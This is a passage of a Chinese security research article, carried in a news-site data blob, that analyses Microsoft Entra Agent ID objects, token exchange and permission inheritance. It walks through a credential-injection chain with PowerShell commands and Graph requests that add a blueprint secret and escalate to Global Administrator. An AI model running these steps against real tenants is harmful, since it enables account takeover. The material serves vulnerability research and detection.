[{"_1":2,"_3":4},"root",{"_5":261},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1795912841000,"id","lxnv0a3ecphevlisp1srqqla3","title","Microsoft Entra Agent ID 凭据注入与钓鱼攻击链分析","originalTitle","Microsoft Entra Agent ID 凭据注入与钓鱼攻击链分析及检测","summary","文章分析 Microsoft Entra Agent ID 的代理蓝图、蓝图主体、代理身份与代理用户对象，复现凭据注入和管理员钓鱼两条利用链。测试覆盖 79 个资源、1041 项权限，97 项被阻止、944 项仍可通过，并发现可继承权限、跨租户蓝图及 AgentIdentity.CreateAsManager 可用于创建子代理身份和提权。","reason","文章拆解了 Entra Agent ID 的对象与令牌交换机制，并用凭据注入和管理员钓鱼复现代理身份提权链及日志检测方法。","source",{"_73":260},"links",{"_252":259},"publishedAt","2026-11-23T12:36:34.000Z","discoveredAt","2026-11-25T09:18:35.695Z","timelineAt","category","ai-security","tags",[74,255,76,256,257,258],"score",76,"selected",true,"channel","news","story",{"_82":83,"_13":84},"x","readingMode","full","author","body",{"_61":251,"_252":-5,"_253":252,"_254":37},"outline",[85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138],"relatedStories",[81],"topics",[68,69,70,71],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","f2cgvVpe8m2o","reportCount",1,"additionalSourceCount",0,{"_72":79,"_73":80},{"_72":77,"_73":78},{"_72":75,"_73":76},{"_72":31,"_73":74},"slug","name","AI 安全","research","技术研究","vuln","漏洞披露","microsoft","Microsoft / 微软",{"_82":83,"_13":84},"publicId","711371aa-e30d-42ab-aa69-8a15609f8b4c","Entra Agent ID攻击链分析",{"_11":249,"_140":250,"_142":143},{"_11":247,"_140":248,"_142":143},{"_11":245,"_140":246,"_142":143},{"_11":243,"_140":244,"_142":143},{"_11":241,"_140":242,"_142":146},{"_11":239,"_140":240,"_142":146},{"_11":237,"_140":238,"_142":146},{"_11":235,"_140":236,"_142":146},{"_11":233,"_140":234,"_142":143},{"_11":231,"_140":232,"_142":143},{"_11":229,"_140":230,"_142":143},{"_11":227,"_140":228,"_142":143},{"_11":225,"_140":226,"_142":143},{"_11":223,"_140":224,"_142":146},{"_11":221,"_140":222,"_142":146},{"_11":219,"_140":220,"_142":143},{"_11":217,"_140":218,"_142":143},{"_11":215,"_140":216,"_142":143},{"_11":213,"_140":214,"_142":146},{"_11":211,"_140":212,"_142":146},{"_11":209,"_140":210,"_142":143},{"_11":207,"_140":208,"_142":146},{"_11":205,"_140":206,"_142":146},{"_11":203,"_140":204,"_142":146},{"_11":201,"_140":202,"_142":146},{"_11":199,"_140":200,"_142":143},{"_11":197,"_140":198,"_142":146},{"_11":195,"_140":196,"_142":146},{"_11":193,"_140":194,"_142":143},{"_11":191,"_140":192,"_142":143},{"_11":189,"_140":190,"_142":146},{"_11":187,"_140":188,"_142":146},{"_11":185,"_140":186,"_142":146},{"_11":183,"_140":184,"_142":146},{"_11":182,"_140":162,"_142":146},{"_11":180,"_140":181,"_142":143},{"_11":178,"_140":179,"_142":146},{"_11":176,"_140":177,"_142":146},{"_11":174,"_140":175,"_142":146},{"_11":172,"_140":173,"_142":165},{"_11":170,"_140":171,"_142":165},{"_11":168,"_140":169,"_142":146},{"_11":166,"_140":167,"_142":165},{"_11":163,"_140":164,"_142":165},{"_11":161,"_140":162,"_142":146},{"_11":159,"_140":160,"_142":143},{"_11":157,"_140":158,"_142":143},{"_11":155,"_140":156,"_142":143},{"_11":153,"_140":154,"_142":143},{"_11":151,"_140":152,"_142":146},{"_11":149,"_140":150,"_142":146},{"_11":147,"_140":148,"_142":146},{"_11":144,"_140":145,"_142":146},{"_11":139,"_140":141,"_142":143},"sec-54","text","参考","level",2,"sec-53","查子 Agent identity 拿令牌的登录记录",3,"sec-52","查每个蓝图造了多少个子身份","sec-51","查蓝图的创建","sec-50","查蓝图上的新增凭据","sec-49","5.2 查询与判读","sec-48","5.1 检测优先级","sec-47","05 检测","sec-46","4.3 两条链的共同点","sec-45","5、利用继承来的权限","sec-44","2）换 Graph 令牌",4,"sec-43","1）蓝图换一个交换令牌","sec-42","4、拿代理身份的令牌","sec-41","2）创建新的代理身份","sec-40","1）拿蓝图主体令牌","sec-39","3、创建代理身份","sec-38","2、钓鱼链接","sec-37","1、新建代理蓝图","sec-36","4.2 案例二：钓鱼","sec-35","sec-34","4、换取有效令牌","sec-33","3、加一个 secretText","sec-32","2、拿 Graph 访问令牌","sec-31","1、拿宿主应用的 refresh token","sec-30","4.1 案例一：凭据注入","sec-29","04 攻击链","sec-28","跨租户场景","sec-27","其他授权途径","sec-26","3.4 其他途径与跨租户","sec-25","4）权限继承","sec-24","3）权限直接授予","sec-23","2）总体限制","sec-22","1）权限可能出现在四个位置","sec-21","3.3 API 权限：四处位置、限制、直接授予、继承","sec-20","2) Azure RBAC Roles（Azure RBAC 角色）","sec-19","1) Entra ID Roles（目录角色）","sec-18","3.2 Entra ID 与 Azure RBAC","sec-17","3.1 安全组","sec-16","03 权限的四个来源","sec-15","第二步交换 Agent identity token","sec-14","第一步交换 Blueprint principal token","sec-13","2.2 两级令牌交换过程","sec-12","2.1 三种认证流程","sec-11","02 认证令牌","sec-10","1.3 凭据为何只存在于蓝图","sec-9","1.2 蓝图创建的流程","sec-8","4）agent's user（代理用户）","sec-7","3）agent identity（代理身份）","sec-6","2）blueprint principa（蓝图主体）","sec-5","1）Agent identity blueprint（代理蓝图）","sec-4","1.1 四个新对象","sec-3","01 对象模型","sec-2","Entra Agent ID","sec-1","前言","<h2 id=\"sec-1\">前言</h2><p>Entra Agent ID 是微软给 AI agent 用的一套身份体系。M365 发布了公告说 11月后普通 Entra 用户默认可以创建代理蓝图，这就把某些攻击场景所需要的管理员权限扩大到了全员。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2029%2F3db6ec86-9c1.png&amp;mode=full&amp;exp=1796169600&amp;sig=2454a18e9195b826\" loading=\"lazy\" decoding=\"async\"></p><p>代理身份是 Entra 里有权限身份， 一旦有人在租户里建起蓝图并配上凭据，凭据一旦落地，访问不再依赖任何人的实时认证，本文从基础知识点入手用完整的攻击链展示：这个载体是怎么被建起来的、权限是怎么流到它身上的、 以及防御方在哪些环节还能看见它。</p><h2 id=\"sec-2\">Entra Agent ID</h2><p>在 Entra ID 里，Microsoft Entra Agent ID为 AI 代理设计了一套独立的身份体系。它建立在与服务主体（service principal）相同的对象模型之上，同时加入了一组新的目录对象和它们之间的关联关系：agent blueprints, blueprint principals, agent's identities, 以及可选的 agent user。并配套 OAuth 2.0、OBO 与客户端凭据之上的代理专用令牌交换流程。</p><p>站在安全的立场上，光判断租户里有没有这类 AI 代理还不够。更需要弄明白的是，代理身份和传统服务主体（比如企业应用）到底哪里不同。具体来说，就是控制权归谁、凭据由谁持有并以何种方式完成认证、它最终能触达哪些资源。</p><p>本篇不打算逐个讲明白 Entra Agent ID 的所有对象和认证流程，这里只是简单过一遍这些概念，让读者有个基本背景，为后文的安全分析提供必要的概念背景。</p><h2 id=\"sec-3\">01 对象模型</h2><h2 id=\"sec-4\">1.1 四个新对象</h2><p>Microsoft 通过 Entra Agent ID 为 Entra ID 引入了新的对象、新的关联方式。这些跟以前那种先注册应用、再变成企业应用的模型不一样。以前传统的模型很直白：应用注册负责管这个应用是什么，企业应用负责管它在这个租户里是谁，两句话就说完了。现在换成 Entra Agent ID，层级就多起来了。到底牵涉哪几个东西，依具体场景而定，可能包括代理蓝图、蓝图主体、一个或多个代理身份，以及可选的代理用户。</p><p>关系如下图：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2029%2F8ba91ced-fc9.png&amp;mode=full&amp;exp=1796169600&amp;sig=4506e80182523053\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-5\">1）Agent identity blueprint（代理蓝图）</h3><p>可以把蓝图理解成一张模板：代理身份照着它来生成，而凭据、需要访问哪些资源这类全局设置，都放在蓝图里，其实就跟传统模型里应用注册承担的角色差不多</p><blockquote><p>官方定义：代理标识蓝图是 Microsoft Entra ID 中的一个对象，用作创建代理标识的模板，参考 <a href=\"https://learn.microsoft.com/zh-cn/entra/agent-id/agent-blueprint\">Microsoft Entra Agent ID | agent-blueprint</a></p></blockquote><h3 id=\"sec-6\">2）blueprint principa（蓝图主体）</h3><p>蓝图主体可以理解为蓝图落地到某个租户后的那份实例。它是替这张蓝图来管下面那批代理身份的，自己不当代理身份。</p><blockquote><p>官方定义：表示特定租户中是否存在代理标识蓝图，令牌的&nbsp;<code>oid</code>&nbsp;声明引用智能体标识蓝图主体在审核日志中记录为由代理标识蓝图主体执行，参考 <a href=\"https://learn.microsoft.com/zh-cn/entra/agent-id/agent-blueprint\">Microsoft Entra Agent ID | agent-blueprint</a></p></blockquote><p>代理身份按需创建，代理用户在其上再叠加一层。那么两个身份对象就会分别产生代理实例：代理身份和代理用户。</p><h3 id=\"sec-7\">3）agent identity（代理身份）</h3><p>AI 代理去访问不同系统时，用来完成认证的那个主账户，就是代理身份。一个蓝图主体底下可以带好几个代理身份，不限于一个。</p><blockquote><p>官方定义：其蓝图定义身份验证设置，并持有所有客户端凭据凭据是在蓝图上配置的，而不是代理标识。</p></blockquote><p>参考 <a href=\"https://learn.microsoft.com/zh-cn/entra/agent-id/agent-identities\">https://learn.microsoft.com/zh-cn/entra/agent-id/agent-identities</a></p><h3 id=\"sec-8\">4）agent's user（代理用户）</h3><p>除了主账户之外，AI 代理还可以选用一个附加账户去访问各类系统，这就是代理用户。它只在代理需要访问那些要求用户对象的系统（如邮箱、Teams）时才必要，并且与代理身份严格一对一。</p><blockquote><p>官方定义：代理的用户帐户表示 Microsoft Entra 中的用户标识子类型与代理标识&nbsp;1:1&nbsp;映射接收具有声明&nbsp;<code>idtyp=user</code>&nbsp;的令牌，参考 <a href=\"https://learn.microsoft.com/zh-cn/entra/agent-id/agent-users\">了解 Microsoft Entra 智能体 ID 中的智能体用户帐户 - Microsoft Entra Agent ID | agent-users</a></p></blockquote><h2 id=\"sec-9\">1.2 蓝图创建的流程</h2><p>1、 Entra 管理中心创建蓝图</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2030%2Fb89c870f-b74.png&amp;mode=full&amp;exp=1796169600&amp;sig=c67c4c8279c733e9\" loading=\"lazy\" decoding=\"async\"></p><p><br>2、蓝图创建时自动生成蓝图主体；代理身份需另建</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2031%2Fe128e61d-8df.png&amp;mode=full&amp;exp=1796169600&amp;sig=04dc5848ed3a9b1c\" loading=\"lazy\" decoding=\"async\"></p><p>3、每个代理身份可以拥有一个代理用户。目前还无法在 Entra 管理中心创建代理用户。只有使用包含至少一个必需权限的令牌，通过调用 <code>/beta/users/microsoft.graph.agentUser</code> Microsoft Graph API 端点，才能创建代理用户账户。<br>对该端点的一个 POST 请求示例</p><pre><code>POST /beta/users/microsoft.graph.agentUser HTTP/2\nHost: graph.microsoft.com\nContent-Type: application/json\nAuthorization: Bearer eyJ...\n\n{\n  \"accountEnabled\": true,\n  \"displayName\": \"Agent User Identity\",\n  \"mailNickname\": \"AgentUser\",\n  \"userPrincipalName\": \"agentuser@[domain]\",\n  \"identityParentId\": \"[Agent_Identity_Object_ID]\"\n}</code></pre><p>4、总体信息如下:<br></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2031%2Ffdd8a6ee-16b.png&amp;mode=full&amp;exp=1796169600&amp;sig=282424d8b5cf649a\" loading=\"lazy\" decoding=\"async\"></p><h2 id=\"sec-10\">1.3 凭据为何只存在于蓝图</h2><p>1、跟老的企业应用那套相比，不同的点是：凭据只放在蓝图这一个地方。<br>2、这些新对象所支持的凭据类型有3种：<br>1）Federated credentials（联合标识凭据）<br>2）Certificates / cryptographic keys（证书或加密密钥）<br>3）Client secrets（客户端密码）</p><p>3、尝试过直接往<code> 蓝图主体</code> 或 <code>代理身份</code> 上加凭据，是加不上的</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2031%2Fe87bd08f-45d.png&amp;mode=full&amp;exp=1796169600&amp;sig=1482973f9f2c343f\" loading=\"lazy\" decoding=\"async\"></p><h2 id=\"sec-11\">02 认证令牌</h2><h2 id=\"sec-12\">2.1 三种认证流程</h2><p>Autonomous app OAuth flow（自主应用流）代理以自身身份运行，只取应用权限<br>On-behalf-of OAuth flow（代表流）代理代表已登录用户行事，取委派权限<br>Agent's user account OAuth flow（代理用户流）以代理专属用户账户的身份行事<br>三种流程都建立在两级令牌交换上。</p><h2 id=\"sec-13\">2.2 两级令牌交换过程</h2><p>Entra Agent ID 这套专属的认证流程的关键在于，代理不再自己持有凭据直接换令牌，改走两级令牌交换（由蓝图代认证，再由代理身份完成访问资源）。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2031%2F6d5cd22c-90d.png&amp;mode=full&amp;exp=1796169600&amp;sig=2ab94ed8f23144ad\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-14\">第一步交换 Blueprint principal token</h3><p>该蓝图的身份凭证被用于 <code>client_credentials</code> 操作，以获取作为蓝图主体身份的令牌。其中一个属性( <code>fmi_path</code> )用于指定令牌所对应代理对象的 ID（OID）。这个令牌的接收者为 <code>api://AzureADTokenExchange/.default</code> ，因此可以在后续的令牌交换中使用它。示例请求如下：</p><pre><code>POST https://login.microsoftonline.com/[Tenant ID]/oauth2/v2.0/token HTTP/2\nHost: login.microsoftonline.com\nContent-Type: application/x-www-form-urlencoded\n\nclient_id=[Blueprint_Application_ID]\n&amp;scope=api://AzureADTokenExchange/.default\n&amp;fmi_path=[Agent_Identity_Object_ID]\n&amp;client_secret=[Blueprint_Secret]\n&amp;grant_type=client_credentials</code></pre><p>请求会返回一个可用于认证令牌，以作为蓝图主体的身份进行认证。</p><h3 id=\"sec-15\">第二步交换 Agent identity token</h3><p>认证令牌被用作第二个 <code>client_credentials</code> 权限授予的凭证代理身份进行请求。示例请求如下：</p><pre><code>POST https://login.microsoftonline.com/[Tenant ID]/oauth2/v2.0/token HTTP/2\nHost: login.microsoftonline.com\nContent-Type: application/x-www-form-urlencoded\n\nclient_id=[Agent_Identity_Object_ID]\n&amp;scope=[Target_Application_Scope]\n&amp;client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer\n&amp;client_assertion=eyJ[Blueprint_Token]\n&amp;grant_type=client_credentials</code></pre><p>请求会返回一个令牌作为代理身份，令牌可以与 Microsoft Graph 一起使用。至此，该蓝图凭证已被用于实际充当代理身份。</p><p>过程可以这样理解：蓝图先用自己的凭据登录，换出一张交换令牌，这张票是给某个具体子代理身份的，子代理身份拿着这张票再去换真正能访问目标资源的那张访问令牌。 这个认证相当于做了一个分工：凭据放在蓝图那，权限放在代理身份那，日志留下的是代理身份。风险是蓝图凭据要是被偷，它底下所有子代理身份等于一起凉。</p><p>出于这项研究的需要，我扩展了 EntraTokenAid（一款用 PowerShell 写的认证工具），把前面提到的几种认证流程都补了进去。文中的示例就是拿它跑出来的。</p><h2 id=\"sec-16\">03 权限的四个来源</h2><p>代理身份的权限来源有四条路径：能通过加进组里拿权限，能被分到 Entra ID 的角色上，也能通过 OAuth2 的委派权限，以及应用角色的授权：<br>1）加入安全组，继承组上已授予的权限<br>2）被直接授予 Microsoft Entra 内置角色或 Azure RBAC 角色（与标准服务主体一致）<br>3）通过 OAuth 2.0 委派权限，代表用户访问资源<br>4）通过应用角色（app role）获得应用权限，以自身身份访问资源</p><p>前两条决定它在目录里有多大权力，后两条决定它能拿到下游资源的什么权限</p><h2 id=\"sec-17\">3.1 安全组</h2><p>组在 Entra 里其实是两类东西：<br>1）普通安全组，涉及的范围只是一个作用域。权限是从别处来的，例如资源授权、许可证、条件访问范围、Windows 365 供给策略<br>2）可分配角色组（<code>isAssignableToRole = true</code>），成员身份直接等于该组绑定的目录角色<br>实际攻防场景中，看到代理出现在某个组里，先查 <code>isAssignableToRole</code> 的属性，如果结果 <code>false</code>，则应该记为作用域。</p><h2 id=\"sec-18\">3.2 Entra ID 与 Azure RBAC</h2><h3 id=\"sec-19\">1) Entra ID Roles（目录角色）</h3><p>微软对代理身份和代理用户能拿哪些高权限角色做了限制。<br>用的是白名单机制。比如全局管理员、特权角色管理员、用户管理员就被做了限制，代理身份也不能成为可分配角色组（role-assignable group）的成员。<br>但机制内，像 Exchange 管理员、SharePoint 管理员、365 管理员这些还是能给的。</p><h3 id=\"sec-20\">2) Azure RBAC Roles（Azure RBAC 角色）</h3><p>代理身份也能被授予 Azure RBAC 角色。实际攻防遇到的场景中，这一块对方基本没有配任何限制。结果就是代理身份和代理用户可能拿着 Azure 资源的特权权限。</p><h2 id=\"sec-21\">3.3 API 权限：四处位置、限制、直接授予、继承</h2><p>委派权限与应用角色同属一套 Graph 权限模型，差别只在于是代表用户行事还是以自身身份行事。有了 Entra Agent ID 之后，API 权限不再集中在一处。</p><h3 id=\"sec-22\">1）权限可能出现在四个位置</h3><p>权限配置散布在多个对象上，因此判断起来更有难度。同样是权限，可能是在蓝图明确声明出来的，可能沿层级继承下来，也可能在模型的某个环节被直接授予。具体落在哪儿，要看这四种位置：<br>1）Agent Blueprint: required resource access<br>2）Agent Blueprint: inheritable permission<br>3）Agent Blueprint Principal<br>4）Agent Identity<br>前两项都挂在蓝图对象上，但是两份不同的配置，作用也不同。</p><h3 id=\"sec-23\">2）总体限制</h3><p>微软确实给代理身份封装了些 API 权限，委派的、应用的都封了，像 Graph 的&nbsp;<code>Chat.Read.All</code>、<code>Application.ReadWrite.All</code>&nbsp;这种直接授不了。</p><p>但别以为特权权限被一刀切了。我拿 79 个资源、1041 项权限挨个试了一遍：97 项被拦，944 项照过。过的里面还有六项算是危险级别的 Graph 应用权限。麻烦就在这儿——拦的和放的，威力差不多：<code>Application.ReadWrite.All</code>&nbsp;关了，<code>Application.ReadUpdate.All</code>&nbsp;还留着，加个凭据、改改应用对象，一样能干。</p><p>再举个例子，<code>ADSynchronization.ReadWrite.All</code>&nbsp;那个（在 Microsoft Entra AD Synchronization Service 上），我测的时候也能授给代理身份。</p><h3 id=\"sec-24\">3）权限直接授予</h3><p>直接授在对象上是最方便的一种给法，委派权限、应用权限都行，跟老式企业应用拿权限是一个意思。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2031%2Fef789ac7-fa6.png&amp;mode=full&amp;exp=1796169600&amp;sig=d917a8304db81129\" loading=\"lazy\" decoding=\"async\"></p><p>但委派权限有个前提：代理身份不能自己单干，得有个用户先通过某个应用登录进来，而这个应用在蓝图主体上得有&nbsp;<code>access-agent</code>&nbsp;这个权限。这样，应用才能顶着这个用户的身份去用代理身份：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2031%2Fc6b4d841-5e5.png&amp;mode=full&amp;exp=1796169600&amp;sig=2b9ebbbb11499988\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-25\">4）权限继承</h3><p>1、一个蓝图主体底下常常挂着好几个代理身份，一个个去授同样的基础权限太麻烦，不如在蓝图主体上同意一次。下面的代理身份就直接继承。在使用可继承的权限时，委派与应用权限都可继承（ <code>inheritable Permissions</code> ）。如果这些委托权限被授予蓝图主体，那么这些权限就会被与蓝图关联的所有代理身份所继承。</p><p>2、权限要真在代理身份身上生效，两个条件缺一不可。<br>第一，蓝图得先\"允许\"。哪些权限能被继承，可以点名某个权限（比如 Graph 的&nbsp;<code>User.Read.All</code>），也可以对某个资源开&nbsp;<code>allAllowed</code>。对 Graph 开了&nbsp;<code>allAllowed</code>，那授予蓝图主体的 Graph 权限就都能继承。<br>第二，这项权限得在蓝图主体上真的授了、也同意了。<br>两个都满足，它才会被塞进代理身份的令牌里。</p><p>3、另外，光看代理身份对象（比如用 Microsoft Graph 查）是看不到继承来的权限的。想知道到底生效了哪些，得把蓝图配置和蓝图主体手上的权限合起来分析。</p><p>4、蓝图主体本身也不是什么权限都能用。测试下来，给它签的令牌里只有&nbsp;<code>AgentIdUser.ReadWrite.IdentityParentedBy</code>&nbsp;和&nbsp;<code>AgentIdentity.CreateAsManager</code>&nbsp;这两项。<br>还有个细节挺关键：<code>AgentIdentity.CreateAsManager</code>&nbsp;在蓝图主体的令牌里一直有，哪怕门户和 Microsoft Graph 上都看不到它被同意过。换句话说，蓝图主体随时都能造个新的子代理身份。</p><h2 id=\"sec-26\">3.4 其他途径与跨租户</h2><h3 id=\"sec-27\">其他授权途径</h3><p>上文列举的授权方式并非所有可用方式。代理身份还能通过其他渠道取得访问权，官方文档就另外提到了几类：Exchange 的 RBAC 角色、Teams 的 RSC 分配、访问包，以及针对自建或第三方 API 的应用角色。</p><p>至于代理用户，它看起来跟普通用户对象没什么两样，除了前面说的那些角色分配限制，授权方式基本可以照普通用户来办。但这部分我没有系统地去测。</p><h3 id=\"sec-28\">跨租户场景</h3><p>1、蓝图跟应用注册一样是有多租户的。蓝图一旦是多租户，蓝图可在对方租户实例化出蓝图主体，并在那边创建本地代理身份：蓝图放在原来那个租户，蓝图主体和手下的代理身份、代理用户，则建在使用方租户里。<br>2、此外，代理身份本身始终是单租户的，只能在创建它的租户里被签发令牌；跨租户的是蓝图，以及由它在各个租户分别生成本地身份的能力。<br>可继承权限跨租户也照用。原租户的蓝图开了这个口子，等蓝图主体被拉进另一个租户时把权限同意掉，那边生出来的代理身份就能继承。<br>这里有个要留意的点：谁能拿到蓝图凭据（凭据在原租户管着），谁就能在对方租户里冒充蓝图主体登录。而蓝图主体的令牌里总有&nbsp;<code>AgentIdentity.CreateAsManager</code>，所以它还能在这张蓝图下面继续造新代理身份。<br>拿这样的代理身份一登录，继承的权限就活了，对方租户里也能直接用。例子里就是靠这个用上了&nbsp;<code>Group.Read.All</code>。</p><h2 id=\"sec-29\">04 攻击链</h2><p>测下来看，Agent ID 是一批新的、底子还是服务主体的身份，行为跟老的应用注册、企业应用不一样。微软虽然封了些高权限角色和 API 权限，但代理身份照样可能握着危险权限，所以它能被塞进提权链条，最后一路干到租户沦陷。<br>下面两个例子，都是攻击者怎么把某个代理身份拿到手的路子，一个是凭据注入，一个是诱导目标点链接。</p><h2 id=\"sec-30\">4.1 案例一：凭据注入</h2><p>这里的情形是，攻击者先拿下了一个蓝图已登录的会话，走完认证流程后拿 Global Administrator</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2031%2F4ef05d4c-a51.png&amp;mode=full&amp;exp=1796169600&amp;sig=baed3676ebfc87b9\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-31\">1、拿宿主应用的 refresh token</h3><pre><code>PS&gt; $tokensTmp = Invoke-Auth -ClientID 'c44b4083-3bb0-49c1-b47d-974e53cbdf3c' -RedirectUrl 'https://startups.portal.azure.com/auth/login/' -Origin 'https://doesnotmatter'\n\nPS&gt; $tokensTmp.refresh_token</code></pre><p>拿到&nbsp;<code>access_token</code>&nbsp;和&nbsp;<code>refresh_token</code>，只使用其中的 refresh token</p><blockquote><p>ClientID 对应的是 Azure Portal，完整对照表可以在 <a href=\"https://entrascopes.com/\">entrascopes.com</a> 里查<br>RedirectUrl 是门户已注册的回调之一<br>Origin 只是请求头，值不参与判定</p></blockquote><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2032%2F9ef03cfd-2c4.png&amp;mode=full&amp;exp=1796169600&amp;sig=10894ded4bab896c\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-32\">2、拿 Graph 访问令牌</h3><p>借 Azure 门户的那张 refresh token，换一张属于另一个应用（“应用注册” blade）的 Graph 访问令牌。</p><pre><code>PS&gt; $tokens = Invoke-Refresh -RefreshToken $tokensTmp.refresh_token -ClientID '18ed3507-a475-4ccb-b669-d66bc9f2a36e' -BrkClientId 'c44b4083-3bb0-49c1-b47d-974e53cbdf3c' -RedirectUri 'brk-c44b4083-3bb0-49c1-b47d-974e53cbdf3c://portal.azure.com' -Origin 'https://portal.azure.com'\n\nPS&gt; $tokens.access_token</code></pre><blockquote><p>ClientID 对应的是&nbsp;<code>Microsoft_AAD_RegisteredApps</code></p></blockquote><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2032%2F02220d6b-589.png&amp;mode=full&amp;exp=1796169600&amp;sig=b53d07a831e2e1c1\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-33\">3、加一个 secretText</h3><p>POST 调用 <code>/applications/&lt;blueprint-id&gt;/addPassword</code>，请求体为 <code>passwordCredential</code> 对象，取回 secretText，凭 secretText 就能直接变成蓝图本身</p><pre><code>POST /v1.0/applications/e6c0f346-22cc-4513-8947-6f3e2936a320/addPassword HTTP/1.1\nHost: graph.microsoft.com\nAuthorization: Bearer &lt;$tokens.access_token&gt;\nContent-Type: application/json\nContent-Length: 128</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2032%2F941d5de7-1d8.png&amp;mode=full&amp;exp=1796169600&amp;sig=7ff8de8d9acbaa72\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-34\">4、换取有效令牌</h3><p>用蓝图的 secret 认证，然后指定“我要某个子代理身份”，换出那个代理身份的令牌。结果的 <code>roles</code>&nbsp;里应该出现继承来的那些权限，这也是整个链条唯一依赖 Agent ID 特性的地方。</p><pre><code>PS&gt; $tokensAgents = Invoke-AgentAutonomousAppFlow -TenantId \"9f412d6a-xxxx-xxxx-xxxx-32e31a6af459\" -BlueprintClientId \"e6c0f346-22cc-4513-8947-6f3e2936a320\" -AgentIdentityClientId \"f6dc46e8-48a2-42c8-83bf-cf639cc3c4d0\" -BlueprintClientSecret \"[secretText]\" -Api \"graph.microsoft.com\"\n\nPS&gt; $tokensAgents</code></pre><blockquote><p>-TenantId 对象所在的租户<br>-Api 要访问的资源</p></blockquote><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2032%2F42da514a-5cc.png&amp;mode=full&amp;exp=1796169600&amp;sig=fd68d78c32073b6a\" loading=\"lazy\" decoding=\"async\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2032%2F8e7265d6-383.png&amp;mode=full&amp;exp=1796169600&amp;sig=e5f41b3e129bd22d\" loading=\"lazy\" decoding=\"async\"></p><p>底层实际上做了两级令牌交换过程：<br>1）蓝图自己身份登录，拿到的是蓝图主体的令牌</p><pre><code>POST https://login.microsoftonline.com/[Tenant ID]/oauth2/v2.0/token HTTP/2\nHost: login.microsoftonline.com\nContent-Type: application/x-www-form-urlencoded\n\nclient_id=[Blueprint_Application_ID]\n&amp;scope=api://AzureADTokenExchange/.default\n&amp;fmi_path=[Agent_Identity_Object_ID]\n&amp;client_secret=[Blueprint_Secret]\n&amp;grant_type=client_credentials</code></pre><p>2）换成代理身份自己的令牌</p><pre><code>POST https://login.microsoftonline.com/[Tenant ID]/oauth2/v2.0/token HTTP/2\nHost: login.microsoftonline.com\nContent-Type: application/x-www-form-urlencoded\n\nclient_id=[Agent_Identity_Object_ID]\n&amp;scope=[Target_Application_Scope]\n&amp;client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer\n&amp;client_assertion=eyJ[Blueprint_Token]\n&amp;grant_type=client_credentials</code></pre><h3 id=\"sec-35\">5、利用继承来的权限</h3><p>例如上文提到的 <code>RoleAssignmentSchedule.ReadWrite.Directory</code> 角色<br>这个 Graph 权限是能直接分 Entra ID 角色。用刚才换到的代理身份令牌，比如给自己套个 Global Administrator<br></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2032%2F01520a85-e26.png&amp;mode=full&amp;exp=1796169600&amp;sig=35414c894aa0002b\" loading=\"lazy\" decoding=\"async\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2032%2F0895f345-ae9.png&amp;mode=full&amp;exp=1796169600&amp;sig=23a385b694b639a6\" loading=\"lazy\" decoding=\"async\"></p><p>这个蓝图所有者往蓝图里加个凭据，拿它登进关联的代理身份，再用这身份的权限把自己升成 Global Administrator</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F23%2F2032%2Ffa0e5185-674.png&amp;mode=full&amp;exp=1796169600&amp;sig=5b6046ec9af94633\" loading=\"lazy\" decoding=\"async\"></p><p>从这个案例来看，代理身份把传统应用的三件事拆给了三个不同的对象：谁能创建（蓝图创建权）、谁能配置凭据（蓝图 